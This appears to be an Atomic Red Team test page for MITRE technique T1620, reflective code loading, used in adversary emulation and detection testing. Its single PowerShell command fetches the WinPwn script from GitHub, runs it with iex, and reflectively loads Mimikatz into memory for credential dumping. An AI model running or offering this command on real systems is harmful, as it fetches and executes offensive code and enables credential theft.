---
tags: [T1620, atomic_test]
filename: "[[T1620 - Reflective Code Loading]]"
---
# T1620 - Reflective Code Loading

## Atomic Test #1 - WinPwn - Reflectively load Mimik@tz into memory
Reflectively load Mimik@tz into memory technique via function of WinPwn

**Supported Platforms:** Windows


**auto_generated_guid:** 56b9589c-9170-4682-8c3d-33b86ecb5119






#### Attack Commands: Run with `powershell`! 


```powershell
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
mimiload -consoleoutput -noninteractive
```






<br/>
